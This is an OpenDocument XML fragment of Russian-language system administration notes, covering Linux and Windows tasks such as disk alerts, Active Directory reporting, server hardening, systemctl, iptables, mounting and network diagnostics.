      <text:p text:style-name="P26">USAGE_INFO=$(df -h "$PARTITION" | awk 'NR==2 {print $5, $1, $2, $3, $4}' | tr '\n' ' ')</text:p>
      <text:p text:style-name="P26">USAGE=$(echo "$USAGE_INFO" | awk '{print int($1)}') <text:s/># Remove the percentage sign</text:p>
      <text:p text:style-name="P26">if [ "$USAGE" -gt "$MAX" ]; then</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/># Send an email alert with detailed disk usage information</text:p>
      <text:p text:style-name="P26"><text:s text:c="2"/>echo -e "Warning: Disk space usage on $PARTITION is $USAGE%.\n\nDisk Usage Information:\n$USAGE_INFO" | \</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/><text:s text:c="4"/>mail -s "Disk Space Alert on $HOSTNAME" "$EMAIL"</text:p>
      <text:p text:style-name="P28">fi</text:p>
      <text:p text:style-name="P26">Список полезных команд для работы с telnet, которые могут помочь при подключении и отладке сетевых служб. Основные команды telnet:</text:p>
      <text:p text:style-name="P26">1) Подключение к удаленному хосту: telnet &lt;hostname&gt; &lt;port&gt;. Пример: <text:s/>telnet example.com 80. Подключается к хосту example.com на порту 80 (HTTP).</text:p>
      <text:p text:style-name="P26">2) Закрытие соединения: Чтобы завершить сессию, используйте сочетание клавиш: Ctrl + ] (переход в режим команд). Затем введите: quit</text:p>
      <text:p text:style-name="P26">3) Отправка текстового запроса после подключения: Если подключились к порту, например, HTTP-сервера, можно отправить запрос вручную: GET / HTTP/1.1. Host: example.com. Это выполняет запрос к домашней странице на порту 80. Встроенные команды telnet (используйте в режиме команд после нажатия `Ctrl + ]`):</text:p>
      <text:p text:style-name="P26">1. help - Показывает список доступных команд telnet: telnet&gt; help</text:p>
      <text:p text:style-name="P26">2. open - Открывает новое соединение с указанным хостом: telnet&gt; open &lt;hostname&gt; &lt;port&gt;</text:p>
      <text:p text:style-name="P26">3. close - Закрывает текущее соединение: telnet&gt; close</text:p>
      <text:p text:style-name="P26">4. display - Показывает текущие параметры подключения: telnet&gt; display</text:p>
      <text:p text:style-name="P26">5. mode - Переключает режим работы telnet (например, line или `character`): telnet&gt; mode line</text:p>
      <text:p text:style-name="P27">6. send - Отправляет управляющие символы (например, send escape для отправки escape-секвенции): telnet&gt; send escape</text:p>
      <text:p text:style-name="P27">7. status - Показывает статус текущего соединения: telnet&gt; status</text:p>
      <text:p text:style-name="P26">8. set и unset - Настраивают параметры подключения (например, установка режима эхо): telnet&gt; set echo telnet&gt; unset echo</text:p>
      <text:p text:style-name="P26">Примеры использования telnet:</text:p>
      <text:p text:style-name="P26">1. Проверка доступности порта: Чтобы проверить, открыт ли порт на удаленном сервере: telnet &lt;hostname&gt; &lt;port&gt;</text:p>
      <text:p text:style-name="P26">2. Проверка почтового сервера (SMTP): Подключение к серверу SMTP: telnet smtp.example.com 25. Затем можно вручную ввести SMTP-команды, такие как: EHLO example.com</text:p>
      <text:p text:style-name="P26">3. Проверка DNS сервера: Можно подключиться к DNS-серверу и проверить его ответы: telnet &lt;dns-server&gt; 53</text:p>
      <text:p text:style-name="P28">Эти команды помогут вам <text:s/>для отладки, диагностики и проверки сетевых служб.</text:p>
      <text:p text:style-name="P26">Powershell суточный отчет по пользователям из ActiveDirectory. Раз в сутки (через планировщик задач) скрипт опрашивает ActiveDirectory на предмет:</text:p>
      <text:p text:style-name="P26">Всего пользователей</text:p>
      <text:p text:style-name="P26">Сколько активных</text:p>
      <text:p text:style-name="P26">Сколько служебных</text:p>
      <text:p text:style-name="P26">Сколько заблокированных</text:p>
      <text:p text:style-name="P26">Сколько новых</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/>$Date = Get-Date -Format "dd MMMM yyyy HH:mm"</text:p>
      <text:p text:style-name="P26">$AllUsers = (Get-AdUser -Filter * | ?{$_.name -notmatch 'Healthmailbox'}).count</text:p>
      <text:p text:style-name="P26">$ActiveUsers = (Get-ADUser -Filter {Enabled -eq $true} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:p>
      <text:p text:style-name="P26">$DisabledUsers = (Get-ADUser -Filter {Enabled -eq $false} | ?{$_.name -notmatch 'Healthmailbox'}).count</text:p>
      <text:p text:style-name="P26">$StartDate = (Get-Date).AddDays(-1)</text:p>
      <text:p text:style-name="P26">$EndDate <text:s text:c="2"/>= (Get-Date).AddDays(+1)</text:p>
      <text:p text:style-name="P26">$Zapros = Get-ADUser -Filter * -Properties Created | Where-Object {$_.Created -gt $StartDate -and $_.Created -le $EndDate}</text:p>
      <text:p text:style-name="P26">$NewUsers = ($Zapros).count</text:p>
      <text:p text:style-name="P26">$OFS = "`r`n" #`r`n`r`n</text:p>
      <text:p text:style-name="P26">"$($WhoUsers = $Zapros | foreach {$_.Name })"</text:p>
      <text:p text:style-name="P26">$NotSurname = Get-ADUser -filter "Enabled -eq '$true' -and Surname -notlike '*' -and Name -ne 'Healthmailbox'"</text:p>
      <text:p text:style-name="P26">$NotFIO = ($NotSurname).count</text:p>
      <text:p text:style-name="P26">$Message = "На $Date в ActiveDirectory всего пользователей $AllUsers из них: `nАктивных: $ActiveUsers из них служебные: $NotFIO. `nЗаблокированных: $DisabledUsers. `nНовых пользователей: $NewUsers `r`n`r`n$WhoUsers"</text:p>
      <text:p text:style-name="P26">$Message | Out-File -FilePath <text:s/>"C:\temp\$(Get-Date -Format "dd MMMM yyyy")-UsersAD.txt"</text:p>
      <text:p text:style-name="P28">После выполнения получаем файлик с текущей датой в папке temp.</text:p>
      <text:p text:style-name="P26">Запускаем ИИ локально:</text:p>
      <text:p text:style-name="P27">1. llama.cpp (https://github.com/ggerganov/llama.cpp) - интерфейс LLaMA на чистом С/С++, работает локально на вашем процессоре;</text:p>
      <text:p text:style-name="P27">2. Jan (https://github.com/janhq/jan) - альтернатива ChatGPT с открытым исходным кодом, которая на работает 100% оффлайн на вашем ПК;</text:p>
      <text:p text:style-name="P26">3. LocalAI <text:s/>(https://github.com/mudler/LocalAI) - автономный, управляемый сообществом, простой локальный API, совместимый с OpenAI, написанный на языке Go;</text:p>
      <text:p text:style-name="P26">4. ollama <text:s/>(https://github.com/ollama/ollama) - инструмент для работы с <text:s/>Llama 2 и другими крупными языковыми моделями на локальном уровне;</text:p>
      <text:p text:style-name="P26">5. LM Studio - софт для <text:s/>исследования, загрузки и запуска различных больших языковых моделей (LLMs);</text:p>
      <text:p text:style-name="P26">6. llamafile <text:s/>(https://github.com/Mozilla-Ocho/llamafile) - позволяет запускать различные LLM одним файлом;</text:p>
      <text:p text:style-name="P28">7. GPT4ALL <text:s/>(https://www.nomic.ai/gpt4all) - еще одно известное решение для запуска локального ChatGPT.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">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text:span><text:soft-page-break/><text:span text:style-name="T5">/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 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span></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7">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7">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text:soft-page-break/>Как защитить сервер Linux?</text:p>
      <text:p text:style-name="P26">1. Обновление системы: Регулярно обновляйте систему и программное обеспечение:</text:p>
      <text:p text:style-name="P26">sudo apt update &amp;&amp; sudo apt upgrade -y # Для Debian/Ubuntu</text:p>
      <text:p text:style-name="P26">sudo yum update -y # Для CentOS/RHEL</text:p>
      <text:p text:style-name="P26">Включите автоматические обновления безопасности.</text:p>
      <text:p text:style-name="P26">2. Настройка брандмауэра: Используйте ufw (Uncomplicated Firewall) или firewalld для управления входящими и исходящими соединениями:</text:p>
      <text:p text:style-name="P26">sudo ufw enable</text:p>
      <text:p text:style-name="P26">sudo ufw allow ssh # Разрешить SSH</text:p>
      <text:p text:style-name="P26">sudo ufw allow http # Разрешить HTTP</text:p>
      <text:p text:style-name="P26">sudo ufw allow https # Разрешить HTTPS</text:p>
      <text:p text:style-name="P26">Запретите все неиспользуемые порты.</text:p>
      <text:p text:style-name="P26">3. Защита SSH: Измените порт SSH по умолчанию (22): sudo nano /etc/ssh/sshd_config; Измените строку Port 22 на другой порт; Отключите вход под root: PermitRootLogin no; Используйте аутентификацию по ключу вместо пароля: PasswordAuthentication no; Ограничьте доступ по IP: AllowUsers user@your_ip</text:p>
      <text:p text:style-name="P26">4. Управление пользователями и правами: Создавайте отдельных пользователей с ограниченными правами для выполнения задач; Используйте sudo вместо входа под root; Регулярно проверяйте список пользователей и удаляйте ненужные учетные записи: sudo deluser username</text:p>
      <text:p text:style-name="P26">5. Установка и настройка Fail2Ban: Fail2Ban блокирует IP-адреса после нескольких неудачных попыток входа:</text:p>
      <text:p text:style-name="P26">sudo apt install fail2ban <text:s/># Для Debian/Ubuntu</text:p>
      <text:p text:style-name="P26">sudo yum install fail2ban <text:s/># Для CentOS/RHEL</text:p>
      <text:p text:style-name="P26">Настройте конфигурацию для SSH и других сервисов.</text:p>
      <text:p text:style-name="P26">6. Отключение ненужных сервисов: Удалите или остановите неиспользуемые сервисы:</text:p>
      <text:p text:style-name="P26">sudo systemctl stop service_name</text:p>
      <text:p text:style-name="P26">sudo systemctl disable service_name</text:p>
      <text:p text:style-name="P26">7. Использование SELinux/AppArmor: Включите SELinux (для CentOS/RHEL) или AppArmor (для Debian/Ubuntu) для усиления безопасности:</text:p>
      <text:p text:style-name="P26">sudo setenforce 1 <text:s/># Для SELinux</text:p>
      <text:p text:style-name="P27">sudo systemctl enable apparmor <text:s/># Для AppArmor</text:p>
      <text:p text:style-name="P27">8. Регулярное резервное копирование: Настройте автоматическое резервное копирование важных данных; Храните резервные копии на отдельном сервере или в облаке.</text:p>
      <text:p text:style-name="P26">9. Мониторинг и логирование</text:p>
      <text:p text:style-name="P26">Используйте инструменты мониторинга, такие как htop, nmon или Prometheus.Регулярно проверяйте логи:</text:p>
      <text:p text:style-name="P26">sudo tail -f /var/log/auth.log <text:s/># Логи аутентификации</text:p>
      <text:p text:style-name="P26">sudo tail -f /var/log/syslog <text:s text:c="3"/># Системные логи</text:p>
      <text:p text:style-name="P26"><text:soft-page-break/>10. Шифрование данных: Используйте шифрование дисков (LUKS) для защиты данных; Настройте SSL/TLS для всех сервисов, работающих с данными.</text:p>
      <text:p text:style-name="P28">11. Аудит безопасности: Используйте инструменты для сканирования уязвимостей, такие как Lynis или OpenSCAP: sudo lynis audit system</text:p>
      <text:p text:style-name="P26">Подборка инструментов для шифрования и хэширования данных. Основная задача хеширования - создать уникальный цифровой «отпечаток» данных, который поможет ускорить обработку информации, защитить её от взлома и упростить идентификацию:</text:p>
      <text:p text:style-name="P26">1. OpenSSL: (https://github.com/openssl/openssl) Широкопрофильная библиотека с реализациями протоколов SSL и TLS, а также инструментов для шифрования, расшифровки, хэширования и управления сертификатами.</text:p>
      <text:p text:style-name="P26">2. Libsodium: (https://github.com/jedisct1/libsodium) Легковесная, высокопроизводительная библиотека для криптографии с простым API для безопасной разработки приложений.</text:p>
      <text:p text:style-name="P26">3. PyCryptodome: (https://github.com/Legrandin/pycryptodome) Библиотека для Python, предлагающая различные криптографические алгоритмы, включая AES, DES, RSA, хэширование и многое другое.</text:p>
      <text:p text:style-name="P26">4. CryptoJS: (https://github.com/brix/crypto-js) Библиотека для JavaScript, позволяющая осуществлять шифрование и хэширование с использованием различных алгоритмов, таких как AES, SHA256 и другие.</text:p>
      <text:p text:style-name="P28">5. bcrypt: (https://github.com/kelektiv/node.bcrypt.js) Библиотека для Node.js и JavaScript, предназначенная для безопасного хэширования паролей с использованием алгоритма bcrypt.</text:p>
      <text:p text:style-name="P26">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добавьте необязательный параметр Force. Например, эта команда отображает прямое содержимое диска C:PowerShell: Get-ChildItem -Path C:\ -Force</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P29">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6">if (Test-Path -Path $PROFILE) {</text:p>
      <text:p text:style-name="P26"><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text:p>
      <text:p text:style-name="P26">Можно также скопировать избранные элементы. Следующая команда копирует все .txt файлы, содержащиеся в любом месте в C:\dataC:\temp\text: Copy-Item -Filter *.txt -Path c:\data -Recurse -Destination C:\temp\text</text:p>
      <text:p text:style-name="P26">Вы по-прежнему можете выполнять собственные команды, такие как xcopy.exe и robocopy.exe копировать файлы.</text:p>
      <text:p text:style-name="P26">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mp\New Folder' -ItemType Directory</text:p>
      <text:p text:style-name="P26">Эта команда создает пустой файл C:\temp\New Folder\file.txt: New-Item -Path 'C:\temp\New Folder\file.txt' -ItemType File</text:p>
      <text:p text:style-name="P26">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text:p>
      <text:p text:style-name="P24"><text:soft-page-break/><text:span text:style-name="T5">Если вам не нужно запрашивать каждый содержащийся элемент, укажите параметр Recurse: Remove-Item -Path C:\temp\DeleteMe -Recurse</text:span></text:p>
      <text:p text:style-name="P27">Всё о монтировании: от системного администрирования до IT криминалистики. Монтирование в Linux позволяет получить доступ к содержимому диска и организовать структуру файловой системы. С помощью монтирования также можно открыть для работы образ диска (например, созданного с помощью программы dd (https://zalinux.ru/?p=5137)), (https://zalinux.ru/?p=5137) а также открыть для доступа и редактирования самые разные файловые системы и образы дисков (например, образы дисков виртуальных машин):</text:p>
      <text:p text:style-name="P26">1. Основы монтирования и использования команды mount (https://hackware.ru/?p=14459#1)</text:p>
      <text:p text:style-name="P26">2. Монтирование образов дисков и доступ к файлам на них (https://hackware.ru/?p=14459#2)</text:p>
      <text:p text:style-name="P26">3. Таблица файловых систем /etc/fstab (https://hackware.ru/?p=14459#3)</text:p>
      <text:p text:style-name="P26">4. Доступ к содержимому дисков виртуальных машин и их изменение (https://hackware.ru/?p=14459#4)</text:p>
      <text:p text:style-name="P26">5. Файловая система в оперативной памяти (https://hackware.ru/?p=14459#5)</text:p>
      <text:p text:style-name="P26">6. Автоматическое монтирование и его отключение (https://hackware.ru/?p=14459#6)</text:p>
      <text:p text:style-name="P26">7. Монтирование сетевых файловых систем (https://hackware.ru/?p=14459#7)</text:p>
      <text:p text:style-name="P28">8. Опции команды mount и опции монтирования (https://hackware.ru/?p=14459#8)</text:p>
      <text:p text:style-name="P26">Управление сервисами systemd через systemctl. 1. Основные команды для управления сервисами. Используем команду systemctl для управления сервисами (демонами) в systemd. Запуск, остановка и перезапуск сервиса:</text:p>
      <text:p text:style-name="P26">sudo systemctl start &lt;service&gt; <text:s text:c="3"/># Запуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl stop &lt;service&gt; <text:s text:c="4"/># Остановка сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl restart &lt;service&gt; <text:s/># Перезапуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl reload &lt;service&gt; <text:s text:c="2"/># Перезагрузка конфигурации (без остановки)</text:p>
      <text:p text:style-name="P26">Включение и отключение автозапуска:</text:p>
      <text:p text:style-name="P26">sudo systemctl enable &lt;service&gt; <text:s text:c="3"/># Включить автозапуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl disable &lt;service&gt; <text:s text:c="2"/># Отключить автозапуск сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl is-enabled &lt;service&gt; <text:s/># Проверить статус автозапуска</text:p>
      <text:p text:style-name="P26">Проверка состояния сервиса:</text:p>
      <text:p text:style-name="P26">systemctl status &lt;service&gt; <text:s text:c="2"/># Проверить текущее состояние сервиса</text:p>
      <text:p text:style-name="P26">journalctl -u &lt;service&gt; <text:s text:c="5"/># Просмотреть логи сервиса</text:p>
      <text:p text:style-name="P26">Проверка запущенных сервисов:</text:p>
      <text:p text:style-name="P26">systemctl list-units --type=service --state=running <text:s/># Вывести запущенные сервисы</text:p>
      <text:p text:style-name="P26">systemctl list-units --type=service <text:s text:c="16"/># Все загруженные сервисы</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. Работа с юнитами systemd. Каждый сервис в systemd представлен в виде юнита (`.service`). Перезапуск systemd и перечитывание конфигурации:</text:span></text:p>
      <text:p text:style-name="P26">sudo systemctl daemon-reexec <text:s text:c="2"/># Перезапуск systemd без перезапуска сервисов</text:p>
      <text:p text:style-name="P26">sudo systemctl daemon-reload <text:s text:c="2"/># Обновить конфигурацию systemd после изменения юнитов</text:p>
      <text:p text:style-name="P26">Редактирование юнитов сервисов:</text:p>
      <text:p text:style-name="P26">sudo systemctl edit &lt;service&gt; <text:s text:c="2"/># Изменить конфигурацию юнита (создает override)</text:p>
      <text:p text:style-name="P26">sudo systemctl cat &lt;service&gt; <text:s text:c="3"/># Просмотреть конфигурацию юнита</text:p>
      <text:p text:style-name="P27">Удаление override-конфигурации: sudo systemctl revert &lt;service&gt;</text:p>
      <text:p text:style-name="P27">3. Дополнительные команды. Маскировка и размаскировка сервиса:</text:p>
      <text:p text:style-name="P26">sudo systemctl mask &lt;service&gt; <text:s text:c="2"/># Полностью отключить сервис (даже если включен)</text:p>
      <text:p text:style-name="P26">sudo systemctl unmask &lt;service&gt; # Разрешить сервис (после mask)</text:p>
      <text:p text:style-name="P26">Выключение и перезагрузка системы через systemd:</text:p>
      <text:p text:style-name="P26">sudo systemctl reboot <text:s text:c="4"/># Перезагрузка системы</text:p>
      <text:p text:style-name="P26">sudo systemctl poweroff <text:s text:c="2"/># Выключение системы</text:p>
      <text:p text:style-name="P26">sudo systemctl suspend <text:s text:c="3"/># Усыпление системы</text:p>
      <text:p text:style-name="P26">sudo systemctl halt <text:s text:c="6"/># Остановка системы без выключения питания</text:p>
      <text:p text:style-name="P26">4. Примеры работы. Запуск и настройка сервиса Nginx:</text:p>
      <text:p text:style-name="P26">sudo systemctl start nginx <text:s text:c="6"/># Запускаем сервис</text:p>
      <text:p text:style-name="P26">sudo systemctl enable nginx <text:s text:c="5"/># Включаем автозапуск</text:p>
      <text:p text:style-name="P26">systemctl status nginx <text:s text:c="10"/># Проверяем статус</text:p>
      <text:p text:style-name="P26">journalctl -u nginx --no-pager <text:s text:c="2"/># Просматриваем логи</text:p>
      <text:p text:style-name="P26">Остановка и отключение сервиса Apache:</text:p>
      <text:p text:style-name="P26">sudo systemctl stop apache2 <text:s text:c="5"/># Остановка сервиса</text:p>
      <text:p text:style-name="P26">sudo systemctl disable apache2 <text:s text:c="2"/># Отключение автозапуска</text:p>
      <text:p text:style-name="P26">sudo systemctl mask apache2 <text:s text:c="5"/># Полностью блокируем его запуск</text:p>
      <text:p text:style-name="P26">Полезные флаги systemctl</text:p>
      <text:p text:style-name="P26">Флаг <text:s text:c="25"/>Описание</text:p>
      <text:p text:style-name="P26">--no-pager <text:s text:c="12"/>Вывод без постраничного просмотра</text:p>
      <text:p text:style-name="P26">--failed <text:s text:c="17"/>Показывает только сбойные юниты</text:p>
      <text:p text:style-name="P26">--type=service <text:s text:c="3"/>Фильтр по типу "service"</text:p>
      <text:p text:style-name="P26">--all <text:s text:c="18"/>Показывает все юниты, включая неактивные</text:p>
      <text:p text:style-name="P31" loext:marker-style-name="T6"/>
      <text:p text:style-name="P26">Полезные команды Linux. Фаервол IPTABLES, штатный, для большинства дистрибутивов Linux:</text:p>
      <text:p text:style-name="P26">iptables -t filter -L - Вывести список всец цепочек правил</text:p>
      <text:p text:style-name="P26">iptables -t nat -L - Вывести все цепочки из NAT таблицы</text:p>
      <text:p text:style-name="P26">iptables -t nat -F - Очистить все цепочки правил в таблице NAT</text:p>
      <text:p text:style-name="P26">iptables -t filter -X - Очистить все пользовательские цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P26">iptables -t filter -F - Очистить все цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT - Разрешить входящие соединения с telnet</text:span></text:p>
      <text:p text:style-name="P26">iptables -t filter -A OUTPUT -p tcp --dport http -j DROP - Запретить исходящие HTTP соединения</text:p>
      <text:p text:style-name="P26">iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE - включить NAT (Network Address Translate) исходящих пакетов на интерфейс eth0. Допустимо при использовании с динамически выделяемыми ip-адресами.</text:p>
      <text:p text:style-name="P26">iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22 - Пересылка пакетов, адресованных одному хосту, на другой хост</text:p>
      <text:p text:style-name="P27">iptables -t filter -A INPUT -j LOG --log-prefix - Включить логгирование пакетов, проходящих через цепочку INPUT, и добавлением к сообщению префикса "DROP INPUT"</text:p>
      <text:p text:style-name="P27">iptables -t filter -A FORWARD -p tcp --dport pop3 -j ACCEPT - Разрешить форвардинг POP3 соединений</text:p>
      <text:p text:style-name="P26">Как вывести список установленных пакетов в Linux по дате? В Linux можно вывести список установленных пакетов с датой установки с помощью различных инструментов, в зависимости от используемого менеджера пакетов. </text:p>
      <text:p text:style-name="P26">1. Для Debian/Ubuntu (dpkg и apt): grep "install " /var/log/dpkg.log ИЛИ если лог-файл архивирован: zgrep "install " /var/log/dpkg.log.*</text:p>
      <text:p text:style-name="P26">Для более удобного вывода: grep "install " /var/log/dpkg.log | awk '{print $1, $2, $5}'</text:p>
      <text:p text:style-name="P26">Если система использует journalctl: journalctl -u apt --no-pager | grep "install "</text:p>
      <text:p text:style-name="P26">2. Для RHEL, CentOS, Fedora (dnf, yum). Список установленных пакетов по дате: rpm -qa --last ИЛИ: rpm -qa --queryformat '%{installtime} %{installtime:date} %{name}-%{version}-%{release}\n' | sort -n</text:p>
      <text:p text:style-name="P26">Если используется dnf: dnf history list</text:p>
      <text:p text:style-name="P26">Чтобы получить подробности о конкретной транзакции: dnf history info &lt;ID_транзакции&gt;</text:p>
      <text:p text:style-name="P26">А для yum: yum history list all</text:p>
      <text:p text:style-name="P26">3. Для Arch Linux (pacman): expac --timefmt='%Y-%m-%d %T' '%l\t%n' | sort -n ИЛИ: grep -E 'installed' /var/log/pacman.log</text:p>
      <text:p text:style-name="P26">4. Для OpenSUSE (zypper): zypper info --installed-only | grep -B 2 "Install Date"</text:p>
      <text:p text:style-name="P26">Вывод в удобном формате. Если нужно отсортировать пакеты по дате и времени: rpm -qa --queryformat '%{installtime:date} %{name}\n' | sort</text:p>
      <text:p text:style-name="P28">Для Debian/Ubuntu: grep "install " /var/log/dpkg.log | awk '{print $1, $2, $5}' | sort</text:p>
      <text:p text:style-name="P26">Как убрать зомби-процессы в Linux. Зомби-процессы (zombie processes) в Linux - это процессы, которые завершились, но их родительский процесс не вызвал wait() для очистки их записи в таблице процессов. Они не используют ресурсы процессора или памяти, но могут засорять таблицу процессов, создавая проблемы при большом их количестве.</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">1) Поиск зомби-процессов. Используйте одну из следующих команд: ps aux | awk '$8=="Z" {print $2, $11}' или ps -eo pid,ppid,stat,cmd | grep 'Z' или с использованием top: Откройте top и нажмите Z (или посмотрите столбец STAT, где зомби-процессы помечены `Z`).</text:span></text:p>
      <text:p text:style-name="P26">2) Удаление зомби-процессов:</text:p>
      <text:p text:style-name="P26">2.1) Завершение родительского процесса. Если зомби-процесс еще существует, это значит, что его родитель не вызвал wait(). Определите родительский процесс (PPID): ps -eo pid,ppid,stat,cmd | grep 'Z'. Завершите его командой: kill -SIGCHLD &lt;PPID&gt;. Если процесс не реагирует, попробуйте: kill -9 &lt;PPID&gt;. Важно! Убедитесь, что родительский процесс не является критичным для системы.</text:p>
      <text:p text:style-name="P26">2.2) Перезапуск родительского процесса. Если завершение родителя недопустимо, попробуйте его перезапустить: systemctl restart &lt;service_name&gt; или service &lt;service_name&gt; restart</text:p>
      <text:p text:style-name="P27">2.3) Использование init/systemd для "усыновления" процесса. Если родительский процесс невозможно завершить или перезапустить, можно заставить init (PID 1) принять осиротевшие зомби. Это можно сделать, перезапустив родительский процесс, а затем проверив: ps -eo pid,ppid,stat,cmd | grep 'Z'</text:p>
      <text:p text:style-name="P27">2.4) Перезагрузка системы (как крайний случай): Если зомби-процессы не исчезают, а их количество растет, можно перезагрузить сервер: reboot или для безопасного завершения всех процессов: shutdown -r now</text:p>
      <text:p text:style-name="P26">3) Предотвращение появления зомби-процессов:</text:p>
      <text:p text:style-name="P26">1. Используйте обработку дочерних процессов в своих скриптах. Если пишете демоны или фоновые процессы, убедитесь, что ваш код корректно вызывает waitpid().</text:p>
      <text:p text:style-name="P26">2. Применяйте обработчики сигналов. В C/C++ можно использовать обработчик SIGCHLD:</text:p>
      <text:p text:style-name="P26">signal(SIGCHLD, SIG_IGN);</text:p>
      <text:p text:style-name="P26">3. Настройте systemd для автоматического управления процессами. В systemd можно создать службу с KillMode=process в /etc/systemd/system/myservice.service:</text:p>
      <text:p text:style-name="P26">[Service]</text:p>
      <text:p text:style-name="P26">KillMode=process</text:p>
      <text:p text:style-name="P28">4. Контролируйте процессы с помощью ulimit. Установите лимиты на максимальное число процессов: ulimit -u 100000</text:p>
      <text:p text:style-name="P26">Автоматическое монтирование дисков в Linux:</text:p>
      <text:p text:style-name="P26">1. Определение дисков и разделов. Перед монтированием нужно узнать, какие диски доступны:</text:p>
      <text:p text:style-name="P26">lsblk <text:s text:c="3"/># Показывает структуру дисков и разделов</text:p>
      <text:p text:style-name="P26">fdisk -l # Выводит информацию о разметке дисков</text:p>
      <text:p text:style-name="P26">blkid <text:s text:c="3"/># Показывает UUID и метки файловых систем</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">2. Монтирование вручную (для проверки): sudo mount /dev/sdXn /mnt. где /dev/sdXn – ваш раздел, /mnt – точка монтирования. Проверить можно командой df -h. Отключение монтирования: sudo umount /mnt</text:span></text:p>
      <text:p text:style-name="P26">3. Автоматическое монтирование через /etc/fstab. Для автоматического монтирования при загрузке добавьте строку в /etc/fstab: UUID=xxxx-xxxx /mnt ext4 defaults 0 2. Как узнать UUID? <text:s text:c="2"/>blkid | grep /dev/sdXn. Формат записи в fstab: &lt;устройство&gt; &lt;точка монтирования&gt; &lt;ФС&gt; &lt;опции&gt; &lt;dump&gt; &lt;pass&gt;. Пример для NTFS (Windows-диски): UUID=xxxx-xxxx /mnt/ntfs ntfs-3g defaults,uid=1000,gid=1000,dmask=027,fmask=137 0 0. Применение без перезагрузки: sudo mount -a</text:p>
      <text:p text:style-name="P26">4. Автомонтирование через systemd (для USB и съемных дисков). Создаем unit-файл: sudo nano /etc/systemd/system/mnt-usb.mount</text:p>
      <text:p text:style-name="P26">Вставляем:</text:p>
      <text:p text:style-name="P26">[Unit]</text:p>
      <text:p text:style-name="P26">Description=Монтирование USB</text:p>
      <text:p text:style-name="P26">Requires=systemd-fsck@dev-sdb1.service</text:p>
      <text:p text:style-name="P26">After=systemd-fsck@dev-sdb1.service</text:p>
      <text:p text:style-name="P26">[Mount]</text:p>
      <text:p text:style-name="P26">What=/dev/sdb1</text:p>
      <text:p text:style-name="P26">Where=/mnt/usb</text:p>
      <text:p text:style-name="P26">Type=vfat</text:p>
      <text:p text:style-name="P26">Options=defaults,noatime</text:p>
      <text:p text:style-name="P26">[Install]</text:p>
      <text:p text:style-name="P27">WantedBy=multi-user.target</text:p>
      <text:p text:style-name="P27">Активируем: sudo systemctl daemon-reload</text:p>
      <text:p text:style-name="P26">sudo systemctl enable mnt-usb.mount</text:p>
      <text:p text:style-name="P26">sudo systemctl start mnt-usb.mount</text:p>
      <text:p text:style-name="P26">5. Автомонтирование через udev (динамическое монтирование). Создаем правило: sudo nano /etc/udev/rules.d/99-usb-mount.rules. Добавляем:</text:p>
      <text:p text:style-name="P26">ACTION=="add", KERNEL=="sd[b-z][1-9]", RUN+="/bin/mount /dev/%k /mnt/usb"</text:p>
      <text:p text:style-name="P26">ACTION=="remove", KERNEL=="sd[b-z][1-9]", RUN+="/bin/umount /mnt/usb"</text:p>
      <text:p text:style-name="P26">Применяем изменения:</text:p>
      <text:p text:style-name="P26">sudo udevadm control --reload-rules</text:p>
      <text:p text:style-name="P28">sudo udevadm trigger</text:p>
      <text:p text:style-name="P26">Проверка SSL-сертификатов с помощью Bash. Иногда нужно быстро проверить срок действия SSL-сертификата удалённого сайта. Вот удобный однострочник на Bash, который покажет дату окончания действия сертификата:</text:p>
      <text:p text:style-name="P26">echo | openssl s_client -servername example.com -connect example.com:443 2&gt;/dev/null \</text:p>
      <text:p text:style-name="P26">| openssl x509 -noout -dates | grep notAfter</text:p>
      <text:p text:style-name="P26">Чтобы получить только оставшиеся дни до окончания:</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">end_date=$(echo | openssl s_client -servername example.com -connect example.com:443 2&gt;/dev/null \</text:span></text:p>
      <text:p text:style-name="P26">| openssl x509 -noout -enddate | cut -d= -f2)</text:p>
      <text:p text:style-name="P26">end_ts=$(date -d "$end_date" +%s)</text:p>
      <text:p text:style-name="P26">now_ts=$(date +%s)</text:p>
      <text:p text:style-name="P28">echo "Осталось дней: $(( (end_ts - now_ts) / 86400 ))"</text:p>
      <text:p text:style-name="P26">Как быстро проверить MTU по пути до хоста и избежать фрагментации. Проблемы с VPN, нестабильной связью или подвисанием SSH? Часто причина - неправильная MTU на пути. Вот как проверить и подобрать оптимальное значение без фрагментации. Шаги для диагностики:</text:p>
      <text:p text:style-name="P26">1. Пингуй с флагом Don't Fragment и уменьшающейся длиной пакета: ping -M do -s 1472 8.8.8.8</text:p>
      <text:p text:style-name="P26">2. Если получаешь Frag needed, уменьши размер: ping -M do -s 1464 8.8.8.8</text:p>
      <text:p text:style-name="P26">3. Найди максимальный размер без фрагментации. MTU = размер + 28 (заголовки IP + ICMP). Например, если -s 1464 работает, MTU = 1464 + 28 = 1492.</text:p>
      <text:p text:style-name="P26">4. Проверь результат через трассировку с DF-флагом: tracepath 8.8.8.8</text:p>
      <text:p text:style-name="P28">Когда пригодится? При настройке WireGuard/OpenVPN, особенно поверх PPPoE или в облаке; При нестабильной TCP-сессии с непредсказуемыми сбоями; Когда сайт грузится частично, а ping работает - классика MTU-багов. Некоторые роутеры режут ICMP, так что тестируй через доступный хост.</text:p>
